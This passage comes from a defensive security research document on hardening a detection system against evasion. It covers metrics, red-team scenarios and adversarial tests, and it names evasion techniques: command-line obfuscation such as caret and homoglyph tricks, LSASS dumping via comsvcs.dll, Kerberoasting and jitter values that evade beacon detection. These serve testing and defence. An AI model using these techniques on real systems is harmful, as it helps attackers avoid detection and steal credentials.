Periodically deposit known-benign pheromones with specific signatures.
Monitor whether these canaries are modified, suppressed, or replayed. If a
canary deposit disappears or is altered, the substrate's integrity has been
compromised.
Priority: **Low.** Effort: **Medium.**

---

## 14. Evaluation Framework

### 14.1 Metrics

To measure detection robustness against evasion, we define the following metrics:

**Evasion Success Rate (ESR).** For a given attack technique T and detector D:

```
ESR(T, D) = |successful_evasions| / |total_attempts|
```

Where `successful_evasions` means the attack completed its objective without
producing a finding from D with confidence >= `medium_confidence_threshold`.

**Detection Coverage Ratio (DCR).** For a MITRE ATT&CK technique T:

```
DCR(T) = |detected_variants| / |known_variants|
```

Where `known_variants` includes all documented execution patterns for the
technique (from ATT&CK, LOLBAS, GTFOBins, etc.).

**Time to Detection (TTD).** Elapsed time from the first adversary action to
the first finding with confidence >= `high_confidence_threshold`. Measures
how quickly slow-and-low attacks are eventually caught.

**Alert Precision.** Among all findings produced during an evaluation period:

```
Precision = |true_positives| / (|true_positives| + |false_positives|)
```

### 14.2 Red-Team Evaluation Scenarios

Each scenario should be executed against the full detector suite in a
controlled environment with complete telemetry capture.

**Scenario 1: LOLBin Rotation.** Execute a payload using each of the 12
missing LOLBins identified in Section 3.3. Measure which produce findings.

**Scenario 2: Slow DNS Exfiltration.** Exfiltrate a 1 MB file using the
dictionary-encoding approach from Section 6.3 at 7 queries/minute with
A records. Measure whether any finding is produced.

**Scenario 3: Beacon Evasion.** Establish C2 using 4 different timing
profiles:
- 60s interval, 10% jitter (should be detected)
- 60s interval, 25% jitter (should evade)
- 300s interval, 10% jitter (should evade)
- 1200s interval, 5% jitter (should evade)

**Scenario 4: Credential Access Bypass.** Perform Kerberoasting using a custom
binary, extract SAM from a volume shadow copy, and dump LSASS via
`comsvcs.dll`. Measure which operations produce findings.

**Scenario 5: Full Kill Chain.** Execute compound evasion chain 8.1 end-to-end.
Measure total findings produced across all detectors.

**Scenario 6: Pheromone Poisoning.** With one compromised agent key, attempt
to: (a) trigger false escalation to Incident mode, (b) suppress escalation
during an active attack by a second operator.

### 14.3 Automated Adversarial Testing

Integrate adversarial test generation into the CI pipeline:

**Property-based evasion tests.** For each detector, define properties that
should hold regardless of input. Use `proptest` or `quickcheck` to generate
telemetry events that explore the input space:

```rust
// Example: any process event with a known-malicious hash
// should produce a finding, regardless of process name
proptest! {
    #[test]
    fn malicious_hash_always_detected(
        process_name in "[a-z]{3,20}\\.exe",
        command_line in ".*",
    ) {
        let event = process_event_with_hash(
            &process_name,
            &command_line,
            KNOWN_MALICIOUS_HASH,
        );
        let findings = detector.evaluate(&event);
        assert!(!findings.is_empty());
    }
}
```

**Mutation-based evasion tests.** Start from known-detected telemetry events
and apply mutations (character substitution, insertion, case changes, field
removal) to find the minimum perturbation that causes detection loss:

```rust
fn mutate_command_line(original: &str) -> Vec<String> {
    vec![
        // String concatenation obfuscation
        original.replace("powershell", "pow\"er\"shell"),
        // Case variation (already handled by to_ascii_lowercase)
        original.to_uppercase(),
        // Character insertion
        original.replace("-enc", "-e^nc"),
        // Environment variable substitution
        original.replace("powershell", "%COMSPEC:~0,0%powershell"),
    ]
}
```

**ATT&CK coverage regression tests.** Maintain a mapping from ATT&CK technique
IDs to test telemetry events. On each detector change, verify that coverage
does not regress. Flag new ATT&CK techniques that are not covered.

### 14.4 Continuous Measurement

Deploy a measurement framework that:

1. **Records** all telemetry events and detector findings in a replay-safe
   format.
2. **Replays** historical telemetry against updated detectors to measure
   detection delta (new findings that would have been caught, and regressions).
3. **Benchmarks** ESR against the standard scenario suite on each release.
4. **Tracks** DCR against the ATT&CK matrix over time, reporting coverage
   percentages per tactic.

---

## 15. Adversarial Testing

> **Added in v0.3** to propose a concrete evasion test suite for validating
> detection robustness.

### 15.1 Evasion Test Suite Design

The current test suite validates that known-bad patterns trigger findings (true
positive tests). What is missing is a complementary suite that validates
detection resilience against adversarial variants (evasion tests). Each evasion
test starts from a known-detected baseline event and applies a specific
obfuscation or substitution technique, asserting either continued detection or
documenting the expected evasion.

### 15.2 Proposed Test Categories

**Category 1: Command-Line Obfuscation Tests.**

For each detector that inspects command lines, generate variants using:

```rust
/// Evasion variant generators for command-line-based detectors.
fn caret_obfuscate(cmd: &str) -> String {
    // Insert carets between every character of key indicator words
    // "powershell" -> "p^o^w^e^r^s^h^e^l^l"
}

fn env_var_obfuscate(cmd: &str) -> String {
    // Replace "powershell" with "%PSModulePath:~0,0%powershell"
    // or "set x=power& set y=shell& %x%%y%"
}

fn string_concat_obfuscate(cmd: &str) -> String {
    // Replace "Invoke-Expression" with "&('Inv'+'oke-Exp'+'ression')"
}

fn unicode_homoglyph(cmd: &str) -> String {
    // Replace ASCII 'e' with Cyrillic U+0435
}
```

Apply each generator to every baseline test event and verify behavior:
- **Regression anchor:** If a variant IS detected, add it as a permanent
  regression test.
- **Evasion documentation:** If a variant is NOT detected, record it as a
  known evasion with the generator name, input, and expected detection after
  hardening.

**Category 2: Process Identity Evasion Tests.**

```rust
fn renamed_binary_test(original_name: &str, renamed_to: &str) -> TelemetryEvent {
    // Create a ProcessStart event with process_name = renamed_to
    // but command_line still containing the original tool's arguments
}

fn path_mismatch_test(process_name: &str, unexpected_path: &str) -> TelemetryEvent {
    // Create a ProcessStart event where executable_path does not match
    // the expected location for process_name
}
```

**Category 3: Timing Evasion Tests.**

For windowed detectors (DNS burst, RDP brute-force, beaconing), generate event
sequences that operate at threshold boundaries:

```rust
fn just_below_burst_threshold(
    detector: &DnsExfiltrationDetector,
    threshold: usize,
    window_ms: i64,
) -> Vec<TelemetryEvent> {
    // Generate threshold-1 events within window_ms
    // Assert: no finding produced
}

fn cross_window_split(
    detector: &DnsExfiltrationDetector,
    threshold: usize,
    window_ms: i64,
) -> Vec<TelemetryEvent> {
    // Generate threshold-1 events at end of one window,
    // threshold-1 events at start of next window
    // Total exceeds threshold but each window is below
    // Assert: no finding produced (documents the gap)
}
```

**Category 4: Beacon Jitter Evasion Tests.**

```rust
fn adaptive_jitter_beacon(
    mean_interval_ms: i64,
    jitter_pct: f64,   // 0.25, 0.30, 0.40, 0.50
    sample_count: usize,
) -> Vec<TelemetryEvent> {
    // Generate beacon events with specified jitter percentage
    // Assert: jitter > 0.20 evades current detector
    // Assert: jitter <= 0.20 is detected
}
```

**Category 5: Adversary Profile Replay Tests.**

For each threat group in Section 11, implement the top-5 TTP sequence as a
multi-event test scenario:

```rust
fn apt29_replay() -> Vec<TelemetryEvent> {
    // Event 1: WMI event subscription write (no WMI telemetry -> no event possible)
    // Event 2: Cobalt Strike beacon at 40% jitter
    // Event 3: SAML token request (no cloud auth telemetry -> no event possible)
    // ... test only emittable events, assert expected detection gaps
}
```

### 15.3 False-Positive Benchmark Suite

Generate a corpus of benign telemetry representing normal enterprise activity:

- Legitimate PowerShell usage: `Get-Process`, `Get-Service`, module imports
- Legitimate LOLBin usage: `certutil -dump cert.cer`, `rundll32 shell32.dll,Control_RunDLL`
- Normal DNS query patterns to CDN subdomains (high entropy but legitimate):
  `d1234567890abcdef.cloudfront.net`, `az-blob-randomhash.blob.core.windows.net`
- Normal authentication patterns: SSH from jump boxes, RDP from admin workstations
- Legitimate scheduled tasks and cron jobs

Run this corpus through all detectors and compute per-detector false-positive
rates. The DNS entropy threshold of 3.5 is particularly important to validate
against real CDN subdomain entropy distributions (see Section 16.4).

### 15.4 Integration with CI

```toml
# Proposed structure for swarm-whisker-bench crate
[package]
name = "swarm-whisker-bench"

[[bench]]
name = "evasion_variants"
harness = false

[[bench]]
name = "false_positive_rate"
harness = false

[[bench]]
name = "adversary_replay"
harness = false
```

Each CI run should produce:
- Detection rate per obfuscation category
- False-positive rate per detector per threshold configuration
- Regression alerts when a previously-detected variant stops being detected
- Performance metrics (latency per event, throughput under load) for stateful
  detectors holding `Mutex`-guarded state

---

## 16. Open Questions and Future Work

### 16.1 Single-Event vs. Stateful Detection

The current architecture evaluates each telemetry event independently through
the `DetectionStrategy::evaluate(&self, event: &TelemetryEvent)` interface.
Stateful detectors (DNS burst, RDP brute-force, beaconing) maintain internal
`Arc<Mutex<HashMap<...>>>` state, but this state is not shared across detectors
and is not correlated across event types.

**Question:** Should we introduce a shared context object passed to `evaluate()`
that contains recent findings, active process trees, and behavioral baselines?
This would enable cross-detector correlation without requiring architectural
changes to the composite dispatch model.

**Trade-off:** Shared mutable state introduces contention on the hot path.
The current per-detector state model (separate `Mutex` per detector) scales
better under high event rates.

### 16.2 Adversarial Machine Learning

As STS moves toward behavioral baselines (doc 06), the detectors will
incorporate statistical models that learn normal patterns. These models are
themselves vulnerable to adversarial machine learning:

- **Poisoning:** Gradually shifting the baseline by introducing slow,
  consistent anomalous activity during the training window until it becomes
  the new normal.
- **Evasion:** Crafting inputs that are adversarial examples for the learned
  model while being functionally malicious.
- **Model extraction:** Observing detector responses to craft a local
  approximation of the model, enabling offline evasion optimization.

These concerns should be addressed in a future research document focused on
adversarial ML robustness.

### 16.3 Sensor Integrity

All detection is only as good as the telemetry. If an adversary can compromise
the sensor (eBPF agent, ETW consumer, auditd), they can suppress or modify
events before they reach the detector. Self-protection mechanisms (doc 07)
should include:

- Sensor liveness monitoring (heartbeat pheromones)
- Redundant sensor paths (e.g., both eBPF and ETW for the same event)
- Hardware-backed attestation of sensor binaries

### 16.4 Adaptive Thresholds

Static thresholds (entropy >= 3.5, burst >= 8, jitter <= 0.20) are inherently
rigid. Future work should explore:

- Per-environment threshold calibration based on observed baseline noise.
- Dynamic threshold adjustment based on current threat level (tighter
  thresholds during elevated pheromone concentration).
- Multi-modal thresholds that combine multiple weak signals (e.g., entropy
  at 3.2 AND subdomain length at 18 AND query rate at 6/min together form a
  strong signal despite each being individually below threshold).

### 16.5 Encrypted Traffic Analysis

As adversaries increasingly use encrypted channels (HTTPS, DNS-over-HTTPS,
WireGuard), network-level detection must shift from payload inspection to
metadata analysis:

- TLS fingerprinting (JA3/JA4 hashes)
- Certificate analysis (self-signed, short-lived, unusual issuer)
- Traffic volume and timing patterns (not just connection events)
- Server Name Indication (SNI) analysis

The current `NetworkConnectDetector` operates on connection metadata (IP, port,
process) but does not analyze TLS or certificate properties.

### 16.6 Rate of Indicator Decay

The pheromone half-life of 3600 seconds (1 hour) may be too aggressive for
some threat classes. A persistence mechanism discovered once should maintain
elevated concentration for days, not hours. Per-threat-class half-life
configuration exists (`ThreatClassConfig`) but is not populated by default.

**Recommendation:** Establish default `ThreatClassConfig` overrides:
- `Persistence`: half-life 86400s (24 hours)
- `SupplyChain`: half-life 86400s (24 hours)
- `CredentialAccess`: half-life 43200s (12 hours)
- `DataExfiltration`: half-life 7200s (2 hours) -- faster decay for
  time-sensitive detection
- `CommandAndControl`: half-life 3600s (1 hour) -- current default

---

## Cross-References

This document is part 1 of 8 in the **Swarm Hardening** research series. Related
documents:

| Document | Relevance |
|----------|-----------|
| **02 -- ATT&CK Coverage Analysis** | Maps current detector coverage against the full MITRE ATT&CK matrix. The evasion gaps identified here (Section 7) directly feed the coverage gap analysis in doc 02. Doc 02 Section 6 (Structural Detectability Gaps) provides the complementary coverage-perspective analysis of the telemetry blind spots discussed in Section 9 of this document. |
| **05 -- Kill Chain Reconstruction and Graph Correlation** | The compound evasion chains in Section 8 demonstrate why single-event detection is insufficient. Doc 05 addresses cross-event correlation that would catch multi-stage attack chains even when individual steps evade detection. |
| **06 -- Behavioral Baseline and Anomaly Detection** | Defines the baseline learning architecture recommended in R14. Behavioral baselines are the primary defense against mimicry attacks (Section 6) and LOLBin evasion (Section 3) where static indicators fail. |
| **07 -- Secure Update and Self-Protection** | Covers sensor integrity (Section 16.3), telemetry attestation (R16), and runtime self-defense against Tier 3 adversaries (Section 2.1) who attempt to tamper with the STS agent itself. |

Related documents from the **Sentinel Convergence** series:

| Document | Relevance |
|----------|-----------|
| **06 -- Stigmergic Coordination and Swarm Intelligence** | Covers the theoretical foundation of the pheromone substrate analyzed in Section 5. |
| **08 -- Resilience Patterns for Distributed Agents** | Addresses the distributed-system failure modes that interact with pheromone poisoning (Section 5). |

---

## References

1. MITRE ATT&CK Framework. https://attack.mitre.org/.
2. LOLBAS Project. https://lolbas-project.github.io/.
3. GTFOBins. https://gtfobins.github.io/.
4. Ongaro, D. & Ousterhout, J. (2014). In Search of an Understandable
   Consensus Algorithm. USENIX ATC.
5. Wagner, D. & Soto, P. (2002). Mimicry Attacks on Host-Based Intrusion
   Detection Systems. ACM CCS.
6. Fogla, P. & Lee, W. (2006). Evading Network Anomaly Detection Systems:
   Formal Reasoning and Practical Techniques. ACM CCS.
7. Shannon, C.E. (1948). A Mathematical Theory of Communication. Bell System
   Technical Journal, 27(3), 379-423.
8. Bernstein, D.J. et al. (2012). High-speed high-security signatures.
   Journal of Cryptographic Engineering, 2(2), 77-89. (Ed25519)
9. Symantec Threat Intelligence. (2025). Living off the Land: Turning Your
   Infrastructure Against You. Annual Threat Report.
10. CrowdStrike. (2025). Adversary Tradecraft: Beacon Timing Analysis and
    Evasion. Threat Research Blog.
11. Mandiant. (2025). APT Lateral Movement: Beyond PsExec. M-Trends Report.
12. Strom, B.E. et al. (2018). MITRE ATT&CK: Design and Philosophy.
    MITRE Technical Report MTR180014.
13. Apruzzese, G. et al. (2023). The Role of Machine Learning in Cybersecurity.
    ACM Computing Surveys, 55(12).
14. Biggio, B. & Roli, F. (2018). Wild Patterns: Ten Years After the Rise of
    Adversarial Machine Learning. Pattern Recognition, 84, 317-331.
15. NIST SP 800-94 Rev. 1 (Draft). (2025). Guide to Intrusion Detection and
    Prevention Systems.
16. Red Canary. (2025). Threat Detection Report: Top ATT&CK Techniques.
